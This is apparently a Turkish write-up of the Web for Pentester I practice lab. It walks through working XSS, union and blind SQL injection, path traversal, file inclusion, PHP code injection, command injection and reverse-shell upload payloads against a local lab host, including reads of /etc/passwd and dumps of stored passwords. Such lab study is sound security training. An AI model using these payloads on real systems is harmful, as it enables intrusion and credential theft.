## Web for Pentester I

### XSS

#### Example 1

İlk örnekte ekrana Hello Hacker yazısı geliyor URL ye baktığımızda **example1.php?name=Hacker** şeklinde bir dizge görüyoruz, buradan anlaşılıyorki name gibi bir parametreye verdiğimiz değer gönderiliyor buraya `<script>alert(1);</script>` yada `<script>alert('Merhaba XSS');</script>`  gibi değerler girdiğimizde hemen hatayı alıyoruz. Oldukça Basitti. Kaynak kodda enjekte ettiğimiz script etiketleri görünür.

```html
<img src = 'https://www.erdoganyoksul.com/wp-content/uploads/2019/02/cropped-eredot_pkfr.png'></img>

<iframe width = 100% height 100% src = 'https://www.erdoganyoksul.com'></iframe><style>*{margin: 0;}</style>
```

Netcat ile bağlanıpta `<script></script>` etiketlerini kaynak koda GET metodu ile gömebiliriz.

> GET /xss/example1.php?name=<script>alert(1);</script> HTTP/1.1
>
> Host: 192.168.56.101



#### Example 2

Bu bölümde ise `<script>alert(1)</script>`  şeklinde sorgu gerçekleştirdiğimizde script etiketleri görmezden geliniyor ve **alert(1)** yazısı ile karşılaşıyoruz. `<Script>alert(1)</Script>` şeklinde bir sorgu ile filtreyi atlatabiliriz. script etiketleri filtrelensede html etiketleri çalışır durumda `<img src = 'kaynak_yok_hata' onerror = 'alert(1)'>
</img>` şeklinde hata alabiliriz.

> `<scr<script>ipt>alert(1);</scr</script>ipt>`

#### Example 3

Bu aşama 2. aşama ile neredeyse aynı `<sc<script>ript>alert(1);</sc</script>ript>` şeklinde bir sorgu ile hatayı alabiliyoruz. `<Script>alert(1);</Script>` şeklinde alamıyoruz ama büyük küçük harfe duyarsız bu sefer.

```html
<img src = 'kaynak' onerror = 'alert(1)'></img>
<style>*{background-color: red;}</style>
```

#### Example 4

Burada `<script>` etiketlerini gördüğü anda ekrana error basıyor fakat html etiketleri çalışıyor **HTML** tagları ile hata alabiliriz.

```html
<img src = 'kaynak' onerror = 'alert(1)'></img>
<a onmouseover = 'alert(1)'>Tıkla ...</a>
<img src=”javascript:alert(‘CanYouPwnMe’)”></img>
<a><div width = 100% height = 100% onmouseover = 'alert(1)'>Read More...</div></a>
```

#### Example 5

Bu aşamada `alert()` fonksiyonunu gördüğü anda ekrana error basıyor bizde alert fonksiyonu yerine **prompt** fonksiyonunu kullanabiliriz `<script>prompt("XSS");</script>`

#### Example 6

Bu aşamada girdiğimiz değer ekrana basılmıyor `<script>` etiketleri çoktan açılmış (demek oluyorki etiket açmamıza gerek kalmadan direkt payload gömebiliriz) bizden alınan parametre kaynak kodda a değişkenine atanıyor burada yapmamız gereken ilk önce o a değişkenine boş değer atamak için **"** karakteri ile stringi kapatmak gerekiyor fakat kapattıktan sonra satır sonunda **";** karakterleri kalıyor bunları disable etmek için 2 yöntem var **//** kullanarak yorum satırı haline getirebiliriz yada var **$x = "** gibi bir değer vererek başka boş bir değer daha ekleyebiliriz.

```html
"; alert(1); // 
"; alert(1); var $x = "
"; alert(document.cookie); var $x = "
</script><script>alert(‘XSS’)</script> bir başka yöntem <script> tagını kapatıp yeniden <script> tagı açmak
```

#### Example 7

Bu aşama 6. aşama ile tamamen aynı fakat bu sefer değer atanırlen "" yerine '' kullanılmış.

```html
'; prompt(1); //
'; alert(1); var $dummy = '
```

#### Example 8

Bu aşamada bizden input alınan bir alan var temel `<script>alert(1);</script>` kodunu denediğimizde kaynak kodda **> <** işaretlerinin encode edildiğini görüyoruz ve alınan değeri **/xss/example8.php** ye **POST** edildiğini görüyoruz. Bu durumda ilk deneyeceğimiz şey **<form …. >** tagının içerisinde script çalıştırmayı denemek olmalı, bunu yapabilmek için girdiğimiz değerde bu dizini sonlandırıp **(/) action=”….”** parametresini kapatıp **( “ )** son olarak form tagınıda kapattıktan **( > )** sonra script kodlarımızı eklemek.

```html
POST /xss/example8.php//"><script>alert(1);</script> HTTP/1.1
Host: 192.168.56.101
```

Şelinde burpsuite ile yada netcat ile de hata alınabilir.

#### Example 9

Burada DOM Based XSS zafiyeti mevcut `#<script>alert(1)</script>` payloadını girip sayfayı yeniledikten sonra hatayı direkt alıyoruz.



### SQL INJECTION

#### Example 1

**http://192.168.56.101/sqli/example1.php?name=root** şeklinde bir URL imiz var name diye bir paremetre alıyor ve veri tabanında bir sorgu gerçekleştirip çıktıyı ekrana basıyor. Sorguyu az çok tahmin edebiliyoruz `SELECT * FROM users WHERE name = 'root'` şeklinde eğer ben root tan sonra **'** işareti atarsam 1 tane, sorgu `SELECT * FROM users WHERE name= 'root''` şeklinde olacak ve SQL Syntax hatası alacağız buda bize **SQL Injection** zafiyetininin olduğunu gösterir. **SQL Injection** zafiyetinin olmaması için girdiğimiz <u>root' parametresini direkt veri tabanında araması gerekiyor</u> fakat burada **'** işaretini **SQL Sorgusuna ait zannediyor aslında SQL Injection zafiyeti SQL Dilinden kaynaklanıyor**. Şimdi bizde `http://192.168.56.101/sqli/example1.php?name=root' or 1 = 1 %23` şeklinde bir değer girelim ve sorgumuzun ne hale geldiğine bakalım `SELECT * FROM users WHERE name = 'root' or 1 = 1 #'` buradaki %23 **#** anlamına gelmektedir ve SQL dilinde **#** karakteri yorum satırı için kullanılır. Şimdi sorgu veri tabanında root u arayacak ve **True** yada **False** gibi değer döndürecek mesela root diye bir kullanıcı yok False döndü ve biz or (yada) operatörü kullanmıştık eğer **1 = 1 ise True dönecek ve 1 herzaman 1 e eşit olacak Yani False or True gibi bir şey elde ettik or (yada) dediğimiz için 1 tane True değerin olması bütün sonucu True yapar ve çıktıdada bütün verileri görürüz** %23 kullanmamızın sebebi ise en sonda bir **'** işareti kalıyor ve onu yorum satırı haline getiriyoruz **SQL Syntax Error** almamak için bunun yerine `http://192.168.56.101/sqli/example1.php?name=root' or '1' = '1` şeklindede bir veri girelibirdik bu sefer sorgu `SELECT * FROM users WHERE name = 'root' or '1' = '1'` şekline dönecekti ve SQL Syntax Error almayız. Şimdi ise bütün verilere nasıl erişebiliriz ona bakalım.



> http://192.168.56.101/sqli/example1.php?name=root' or 1 = 1 order by 1,2,3,4,5,6 %23

Değerlerini giriyoruz ve çıktı alamıyoruz fakat `http://192.168.56.101/sqli/example1.php?name=root' or 1 = 1 order by 1,2,3,4,5 %23` değerlerini girdiğimizde çıktı alabiliyoruz bu demek oluyorki tabloda 5 column (stün) var demek.



> http://192.168.56.101/sqli/example1.php?name=root' or 1 = 1 union select 1,2,3,4,5 %23

union ile 2 sorguyu birleştiriyoruz ve column ları gelen bütün verilerin en altına ekliyoruz.

> http://192.168.56.101/sqli/example1.php?name=root' or 1 = 1 union select group_concat(schema_name),2,3,4,5 from information_schema.schemata %23

Veri tabanlarını getirir.

> http://192.168.56.101/sqli/example1.php?name=root' or 1 = 1 union select group_concat(table_name),2,3,4,5 from information_schema.tables %23

Bütün tabloları getirir.

> http://192.168.56.101/sqli/example1.php?name=root' or 1 = 1 union select group_concat(table_name),2,3,4,5 from information_schema.tables where table_schema = 'exercises' %23

exercises veri tabanına ait tabloları getirir `table_schema = database()` şeklinde kullanımla o anki kullanılan (seçilmiş olan) veri tabanındaki tabloları getirir.

> http://192.168.56.101/sqli/example1.php?name=root' or 1 = 1 union select group_concat(column_name),2,3,4,5 from information_schema.columns where table_name = 'users' %23

users tablosuna ait columnları getirir.

> http://192.168.56.101/sqli/example1.php?name=root' or 1 = 1 union select group_concat(id,":",name,":",age,":",groupid,":",passwd),2,3,4,5 from users %23

users tablosundan id,name,age,groupid,passwd columnlarındaki verileri getirir. **"Çıktı:** 
**1:admin:10:10:admin,2:root:30:0:admin21,3:user1:5:2:secret,5:user2:2:5:azerty"**



### Blind SQL Injection - Also Known As 'Inferential SQL injections'

"Blind Sql Injection" Bir Injection Yöntemidir.Bu Hata Almadan Uygulayacağımız Bir Yöntemdir.Blind Kör Anlamına Gelmektedir.Sitenin Sonuna ' İşareti Koyduğumuzda Site Hata Vermek Yerine Sayfa Değiştirir.Yani Site Hata Vermez Fakat Biz Hatayı Sayfanın Değişmesinden Anlarız.

> http://192.168.56.101/sqli/example1.php?name=root' and CHAR_LENGTH((select count(*) from information_schema.schemata)) = 1 %23

Kaç adet veri tabanı var sorgusunun çıktısının karakter uzunluğunu öğrenmek için kullanmamız gereken sorgu.

> http://192.168.56.101/sqli/example1.phpname=root' and CHAR_LENGTH((select count(*) from information_schema.tables where table_schema = 'exercises')) = 1 %23

exercises veri tabanında kaç adet tablo var sorgusunun karakter uzunluğunu verir.

> http://192.168.56.101/sqli/example1.php?name=root' and CHAR_LENGTH((select count(*) from information_schema.columns where table_name = 'users')) = 1 %23 

users tablosunda kaç adet column (sütun) var sorgusunun çıktısının karakter uzunluğunu verir.

> http://192.168.56.101/sqli/example1.phpname=root' and CHAR_LENGTH((select schema_name from information_schema.schemata limit 0,1)) = 18 %23

1.veri tabanının adının karakter uzunluğu 18 mi?

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select schema_name from information_schema.schemata limit 0,1),1,1)) = 105 %23

İlk veritabanının ilk harfi

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select schema_name from information_schema.schemata limit 0,1),2,1)) = 105 %23

İlk veritabanının ikinci harfi

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select schema_name from information_schema.schemata limit 1,1),1,1)) = 105 %23

İkinci veritabanının ilk harfi

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select table_name from information_schema.tables where table_schem = 'information_schema' limit 0,1),1,1)) = 67 %23

information_schema veri tabanındaki ilk tablonun ilk harfi

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select table_name from information_schema.tables where table_schem = 'information_schema' limit 0,1),2,1)) = 67 %23 

information_schema veri tabanındaki ilk tablonun ikinci harfi

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select table_name from information_schema.tables where table_schem = 'information_schema' limit 1,1),1,1)) = 67 %23

information_schema veri tabanındaki ikinci tablonun ilk harfi

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select column_name from information_schema.columns where table_name = 'CHARACTER_SETS' limit 0,1),1,1)) = 67 %23

CHARACTER_SETS tablosundaki ilk column un ilk harfi 

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select column_name from information_schema.columns where table_name = 'CHARACTER_SETS' limit 0,1),2,1)) = 67 %23

CHARACTER_SETS tablosundaki ilk column un ikinci harfi

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select column_name from information_schema.columns where table_name = 'CHARACTER_SETS' limit 1,1),1,1)) = 67 %23

CHARACTER_SETS tablosundaki ikinci column un ilk harfi

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select CHARACTER_SET_NAME from information_schema.CHARACTER_SETS limit 0,1),1,1)) = 98 %23

CHARACTER_SETS tablosundaki CHARACTER_SET_NAME column unun ilk elemanının ilk harfini getiriyor burada dikkat etmemiz gereken nokta tablo ismini verirken database.tablo_ismi şeklinde vermemiz gerekir çünki burada database seçili değildir.

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select count(*) from information_schema.schemata),1,1)) = 50 %23

Kaç adet veri tabanı olduğunu öğrenmek için kullanılacak sorgu

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select count(*) from information_schema.tables where table_schema = 'exercises'),1,1)) = 49 %23

exercises veri tabanında kaç adet tablo olduğunu öğrenmek için kullanılacak sorgu

> http://192.168.56.101/sqli/example1.php?name=root' and ascii(substring((select count(*) from information_schema.columns where table_name = 'users'),1,1)) = 53 %23

users tablosunda kaç adet column(sütun) olduğunu öğrenmek için kullanacağımız sorgu.



#### Example 2

`http://192.168.56.101/sqli/example2.php?name=root' or 1 = 1 %23` şeklinde bir sorgu denediğimizde **ERROR NO SPACE** şeklinde bir hata ile karşılaşıyoruz burada yazılımcı boşluk karakterini kullanmamıza izin vermemiş yani **URL** de **%20** (boşluk karakterinin encode hali) ile karşılaşırsa hata vermesini söylemiş bizde tab ifadesinin encode hali olan **%09** ifadesini sorgularımızın içine yerleştireceğiz ve bu filtreyi atlatacağız.

`http://192.168.56.101/sqli/example2.php?name=root'%09or%091%09=%091%09%23`

Diğer verileri ele geçirmek için yukarıdaki yöntemin aynısı geçerli fakat boşluk (%20) olan yerleri %09 (tab) ile değiştirmemiz gerekiyor. 

`http://192.168.56.101/sqli/example2.phpname=root'%09or%091%09=%091%09union%09select%09group_concat(id,":",name,":",age,":",groupid,":",passwd),2,3,4,5%09from%09users%09%23`

#### Example 3

Bu aşama bir önceki aşama ile aynı bu sefer **%09** ilede atlatamıyoruz hatayı bizde yorum satırı için kullanılan **/***  ***\** karakterlerini kullanarak sorgularımızın arasında boşluklar bırakacağız.

`http://192.168.56.101/sqli/example3.php?name=root'/**/or/**/1/**/=/**/1/**/%23`

`http://192.168.56.101/sqli/example3.phpname=root'/**/or/**/1/**/=/**/1/**/union/**/select/**/group_concat(id,":",name,":",age,":",groupid,":",passwd),2,3,4,5/**/from/**/users/**/%23`

#### Example 4

Burada URL nin sonuna **'** attığımızda hata alıyoruz fakat **or '1' = '1** şeklinde bir sorgu denediğimizdede hata alıyoruz fakat bize veriler gelmiyor direkt tırnak işareti kullanmadan **or 1 = 1** dediğimizde veriler geliyor bu aşamada programcı sorgularda **'** işareti kullanmamış.

`http://192.168.56.101/sqli/example4.php?id=2 or 1 = 1 union select group_concat(id,name,age,groupid,passwd),2,3,4,5 from users`

#### Example 5

Bu aşamada da programcı bizden yalnızca integer değerler alıyor **http://192.168.56.101/sqli/example5.php?name='1**' şeklinde sorgu girdiğimizde  **ERROR INTEGER REQUIRED** şeklinde hata alıyoruz.

`http://192.168.56.101/sqli/example5.php?id=1 or 1 = 1 union select group_concat(name,passwd),2,3,4,5 from users %23`

#### Example 6

Bu bölğmdede bir integer kontrolu var fakat buradaki bir öncekinden çok farklı çalışıyor. Bir önceki integer değerler istiyordu bu seferki ifadenin başına ve sonuna bekıyor 2 side integer ise sorun yok eğer integer değil ise hata döndürüyor **(ERROR INTEGER REQUIRED)**.

`http://192.168.56.101/sqli/example6.php?id=2 or 1 = 1` denersek başarılı sonuç döner
`http://192.168.56.101/sqli/example6.php?id=2 or 1 = 1 %23` denersek sonuna bir tane integer değer atmamız gerekir başarılı sonuç alamayız.

> http://192.168.56.101/sqli/example6.php?id=2 or 1 = 1 %23 1
> http://192.168.56.101/sqli/example6.php?id=2 or 1 = 1 union select group_concat(name,passwd),2,3,4,5 from users %23  1

#### Example 7

Bu bölümde de bir integer filtrelemesi var. Ama bir önceki bölümden farkı ifadenin başına ve sonuna değil tamamına bakıyor. Bundan dolayı az önceki yöntem bizim filtrelemeyi aşmamızı sağlamıyor. Burada farklı bir durum var alınan ifade satır satır alınıyor ve alınan en son satırdaki ifade integer ise filtreleme sorun çıkartmıyor. Bizimde normalde bir satır ifade göndermemiz beklendiği için bu filtrelemenin aşılmaması gerekiyor. Fakat biz burada new line encode haliolan **%0A** ifadesini kullanacağız. Bu ifade bir alt satıra geç demek, program bir alt satıra geçecek ve geçtikten sonraki ifade eğer integer ise hata vermeyecek.

`http://172.16.248.132/sqli/example7.php?id=2%0Aor 1 = 1`

`http://192.168.56.101/sqli/example7.php?id=1 %0A or 1 = 1 union select name,passwd,3,4,5 from users`

#### Example 8

Bu bölümde ise order by kullanıldığı belli oluyor. Ama order by sql ifadesinin en sonunda olduğu için bu sql injection bi işimize yaramayacaktır. Herhangi bir yere sıçrayarak veri elde edemeyiz. Bu sadece sql injection var diyebileceğimiz bir alandır. İfade şu şekilde olacaktır.

>  http://172.16.248.132/sqli/example8.php?order=name` desc %23

#### Example 9

Bir önceki bölümün aynısıdır. Ama tırnak işaretini koymamıza gerek yok.

`http://172.16.248.132/sqli/example9.php?order=name desc %23`



### DIRECTORY TRAVERSAL

#### Example 1

Bu kısımlarda bize link verilmemiş onun yerine resimler verilmiş kaynak koda bakıpta resimlerin yollarını öğreniyoruz.

`http://192.168.56.101/dirtrav/example1.php?file=hacker.png` Burada kullanıcıdan parametre olarak alınan bir resim tekrar ekranda gösteriliyor eğer burada alınan veride filtreleme yapılmamışsa ve saldırgan .. / \ gibi karakterleri kullanabiliyorsa saldırgan dizin değiştirebilir başka dosyaları okuyabilir hatta dosya oluşturabilir. 

> http://192.168.56.101/dirtrav/example1.php?file=../../../../../../../etc/passwd
>
> http://192.168.56.101/dirtrav/example1.php?file=../../../../../../../etc/shells
>
> http://192.168.56.101/dirtrav/example1.php?file=../../../../../../../etc/services
>
> http://192.168.56.101/dirtrav/example1.php?file=../../../../../../../etc/hosts
>
> http://192.168.56.101/dirtrav/example1.php?file=../../../../../../../home/user/.bashrc - **/etc/passwd** den user 
> isminde bir kullanıcı olduğunu öğrendik.

#### Example 2

Bu bölümde bize direk dosyanın yolunuda vermişler hangi dizinde olduğumuzu rahatlıkla anlayabiliyoruz.

> http://192.168.56.101/dirtrav/example2.php?file=/var/www/files/../../../../etc/passwd
>
> http://192.168.56.101/dirtrav/example2.php?file=/var/www/files/../../../../etc/shells
>
> http://192.168.56.101/dirtrav/example2.php?file=/var/www/files/../../../../etc/services
>
> http://192.168.56.101/dirtrav/example2.php?file=/var/www/files/../../../../etc/hosts
>
> http://192.168.56.101/dirtrav/example2.php?file=/var/www/files/../../../../home/user/.bashrc - **/etc/passwd** den 
> user isminde bir kullanıcı olduğunu öğrendik.

#### Example 3

Bu bölümde bize direk dosyanın yolunuda vermişler hangi dizinde olduğumuzu rahatlıkla anlayabiliyoruz. Bu kısımda dosyanın uzantısı URL de verilmemiş.Bizim istediğimiz yola giderken bir syntax hatası ile karşılaşmamak için bu eklenen uzantıyı iptal etmemiz gerekiyor. Bunuda **%00** yani **NULL** ifadesi ile yapabiliyoruz. **php** bu ifadeyi gördükten sonra kalan kısmı okumaz.

> http://192.168.56.101/dirtrav/example3.php?file=../../../../../../etc/passwd%00
>
> http://192.168.56.101/dirtrav/example3.php?file=../../../../../../etc/shells%00
>
> http://192.168.56.101/dirtrav/example3.php?file=../../../../../../etc/services%00
>
> http://192.168.56.101/dirtrav/example3.php?file=../../../../../../etc/hosts%00
>
> http://192.168.56.101/dirtrav/example3.php?file=../../../../../../home/user/.bashrc%00 - **/etc/passwd** den user 
> isminde bir kullanıcı olduğunu öğrendik.

### FILE INCLUDE

File Inclusion, yani dosya dahil etme saldırısı saldırganın hedef web sitesine bir dosya dahil etmesine ya da hedef web sitesinin kendinde olan ama sunmadığı bir dosyayı görüntüleyebilmesine denir. File Inclusion açıklığını kullanan iki tür saldırı vardır: Bunlardan birincisi Local File Inclusion diye adlandırılmaktadır, ikincisi ise Remote File Inclusion diye adlandırılmaktadır. Local File Inclusion saldırısı hedef sitenin barındığı sunucudaki ziyaretçilere sunulmamış dosyanın hedef site üzerinden görüntülenebilmesine denir. Remote File Inclusion saldırısı ise hedef siteye saldırganın kendi dosyasını (mesela shell dosyasını) görüntületmesine denir. 

#### Example 1

> http://192.168.56.101/fileincl/example1.php?page=/etc/passwd
>
> http://192.168.56.101/fileincl/example1.php?page=http://example.com/index.php
>
> http://192.168.56.101/fileincl/example1.php?page=../../../../../../etc/passwd
>
> http://192.168.56.101/fileincl/example1.php?page=../../../../../../etc/shells
>
> http://192.168.56.101/fileincl/example1.php?page=../../../../../../etc/services
>
> http://192.168.56.101/fileincl/example1.php?page=../../../../../../etc/hosts
>
> http://192.168.56.101/fileincl/example1.php?page=../../../../../../home/user/.bashrc

Burada sunucuda önceden bulunan bir dosyaya eriştiğimiz için Local File Inclusion gerçekleştirmiş olduk.

#### Example 2

Burada programcı dosya uzantıları göstermemiş bunu atlatmak için %00 kullanabiliriz.

> http://192.168.56.101/fileincl/example2.php?page=/etc/passwd%00
>
> http://192.168.56.101/fileincl/example2.php?page=http://example.com/index%00
>
> http://192.168.56.101/fileincl/example2.php?page=../../../../../../etc/passwd%00
>
> http://192.168.56.101/fileincl/example2.php?page=../../../../../../etc/shells%00
>
> http://192.168.56.101/fileincl/example2.php?page=../../../../../../etc/services%00
>
> http://192.168.56.101/fileincl/example2.php?page=../../../../../../etc/hosts%00
>
> http://192.168.56.101/fileincl/example2.php?page=../../../../../../home/user/.bashrc%00

### CODE INJECTION

Kod enjrksiyonu zafiyeti SQL Enjeksiyonuna çok benzer temelde kullanıcının girdiği verinin işlenmemesinden kaynaklanır burada kullanıcı sisteme kod enjekte edebilir bu dilden dile değişiklik gösterir burada php dili kullanılmış bizde örnekleri php dili ile çözeceğiz.

#### Example 1

Burada **http://192.168.56.101/codeexec/example1.php?name=hacker** **name** gibi bir parametreye değer göderiyoruz ve değer ekrana yazdırılıyor. Buraya **php** kodlarımızı yazarsak yorumlanıp çalıştırırlacaktır. ` http://192.168.56.101/codeexec/example1.php?name=hacker"; $var = "VULNERABLE"; echo $var; //` Buradaki **// PHP** de yorum satırı anlamına geliyor. Kaynak kodda şu şekilde bir satır olduğunu düşünürsek.

```php
<?php
$str="echo \"Hello ".$_GET['name']."!!!\";";
eval($str);
?>
```

Girilen değere **Hello ve !!!** ekliyor ve eval fonksiyonu ile ekrana bastırıyor. `hacker"; $var = "VULNERABLE"; echo $var; //` şeklinde bir ifade verdiğimizde kaynak kod şu şekle dönecek.

```php
<?php
$str="echo \"Hello "."hacker"; $var = "VULNERABLE"; echo $var; //"."!!!\";";
eval($str);
?>
```

**//** koyduğumuz için **!!!** işaretleri yorum satırına dönüşecek ve ünlem işaretlerini çıktıda göremeyeceğiz. Sistemde çeşitli komutlar çalıştıtılabilir.

> http://192.168.56.101/codeexec/example1.php?name=hacker"; system("whoami"); //
>
> http://192.168.56.101/codeexec/example1.php?name=hacker"; system("pwd"); //
>
> http://192.168.56.101/codeexec/example1.php?name=hacker"; system("ls"); //
>
> http://192.168.56.101/codeexec/example1.php?name=hacker"; system("cat /etc/passwd"); //
>
> http://192.168.56.101/codeexec/example1.php?name=hacker"; system("cat /etc/shells"); //
>
> http://192.168.56.101/codeexec/example1.php?name=hacker"; system("cat /etc/hosts"); //
>
> http://192.168.56.101/codeexec/example1.php?name=hacker"; system("cat /etc/services"); //
>
> http://192.168.56.101/codeexec/example1.php?name=hacker"; system("ls /home"); //

Gibi bir çok komut çalıştırılabilir.

#### Example 2

**http://192.168.56.101/codeexec/example2.php?order=name"; echo "VULNERABLE"; //** Şeklinde bir sorgu denediğimizde **PHP** bize bir hata döndürüyor hata mesajında ise runtime-created function on line 1 Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/codeexec/example2.php on line 22 diyor burada PHP de usort fonksiyonunun kullanıldığını öğreniyoruz.
`https://www.w3schools.com/php/func_array_usort.asp - usort kullanımı.`

Kaynak kod aşağıdaki gibi

```php
require_once('../sqli/db.php');
$sql = "SELECT * FROM users ";
$order = $_GET["order"];
$result = mysql_query($sql);
if ($result) {
while ($row = mysql_fetch_assoc($result)) {
$users[] = new User($row['id'],$row['name'],$row['age']);
}
if (isset($order)) {
usort($users, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
}}
```

Payload :` id);}system('cat /etc/passwd');//`

usort fonksiyonu **create_function** fonksiyonu ile birliktede kullanılabilir bir arrayı sıralamaya yarar ama şart 
belirtirken bir fonksiyon kullanırız kısaca açıklarsak burada usortun dikkatsiz kullanımından ve alınan verinin 
incelenip ayıklanmamasından kaynaklanan bir zafiyet mevcut.

#### Example 3

Burada phpnin `preg_replace()` fonksiyonu kullanılmış. Bu fonksiyon kullanımı şu şekilde:

`preg_replace($pattern, $new, $base);`

php burada aldığı pattern regex’ine göre **\$base** değişkeni içerisinde değişlik yaparak \**$new** ifadesini koyuyor. Bilinmesi gereken ise regex ifadesi ile atraksiyonlar yapılabildiği. Burada eğer regex ifadenin en sonuna **“e”** yazılırsa \**$new** ile gelen ifade php tarafından bir fonksiyon olarak yorumlanıyor.

`/codeexec/example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello lamer phpinfo()` fonksiyonunu çalışıtırabildik. Bu şekilde istenilen fonksiyo çalıştırılabilir. `/codeexec/example3.php?new=system("ls")&pattern=/lamer/e&base=Hello lamer`

#### Example 4

Bu bölümde ise hacker’ ifadesini parametre olarak verdiğimiz zaman karşımıza çıkan hatadan phpnin assert() fonksiyonunun kullanıldığını görebiliyoruz. Burada şu ifadeyi yazarak istediğimiz fonksiyonu çalıştırabiliriz. `/codeexec/example4.php?name=hacker'.system("ls");%23`

### COMMANDS INJECTION

Komut enjeksiyonu kullanıcıdan alınan sistem komutlarının sistemde çalıştırılmasından ve kullanıcıdan alınan verinin yine ve yine filtrelenmemesinden ve ayıklanmamasından kaynaklanan bir zafiyettir oldukça riskli bir zafiyettir sistemde herkes tarafından okunulabilen kritik dosyalar okunabilir.

#### Example 1

Burada bizden bir IP adresi alıyor ve o IP adresine ping atıyor sistemde şu şeklide bir komut çalıştığını tahmin edebiliriz.

`ping [IP]` peki ben URL de (get metodu ile alıyor) **;** ile satırı sonlandırıp farklı bir komut girersem ne olur?

> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;ls;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;pwd;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;cat /etc/hostname;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;whoami;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;ls /etc;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;ls /home;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;cat /etc/passwd;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;cat /etc/services;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;cat /etc/hosts;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;cat /etc/shells;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;ls /bin;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;cat /proc/meminfo;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;df -h;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;ps aux;
>
> http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1;echo $SHELL;

#### Example 2

Bu örnekte ise bizden alınan IP adresinin gerçekten bir IP adresi olup olmadığını kontrol etmiş fakat kullanıcıdan alınan değer sanki tek satırmış gibi düşünülmüş zira URL yazdığımız alanda alt satıra geçemiyoruz ama **"%0A"** karakterlerini kullanarak sistemde alt satıra geçebiliriz.

`http://192.168.56.101/commandexec/example2.php?ip=127.0.0.1%0Als;`

`http://192.168.56.101/commandexec/example2.php?ip=127.0.0.1%0Acat /etc/passwd;`

#### Example 3

Bu bölümde de IP adresi filtrelemesi var eğer IP adresi istenildiği gibi değilse bir şeyler yanlış gidiyorsa yönlendirme yapılıyor ve `http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1 `adresine gidiyoruz buradaki zafiyet ise kodlar çalıştırıldıktan sonra yönlendirme işlemi yapılıyor.

`netcat 192.168.56.101 80` bağlantı açıp

```http
GET http://172.16.248.132/commandexec/example3.php?ip=127.0.0.1;ls HTTP\1.0
Host: 192.168.56.101
```

satırlarını giriyoruz ve bir HTTP isteği atıyoruz ve gelen kaynak kodda istediğimiz çıktıyı görebiliyoruz.

### FILE UPLOAD

#### Example 1

İlk örnekte dosya uzantısına bakmadan dosya yüklememize izin veriyor direkt reverse_shell.php dosyası yükliyip reverse shell alabiliriz.

#### Example 2

Bu örnekte ise **.php** uzantılı dosya yüklememize izin verilmiyor bizde **reverse_shell.php** dosyasının sonuna **.veri** gibi bir değer girersek bu filtreyi atlatıp dosya yükleyebiliriz.

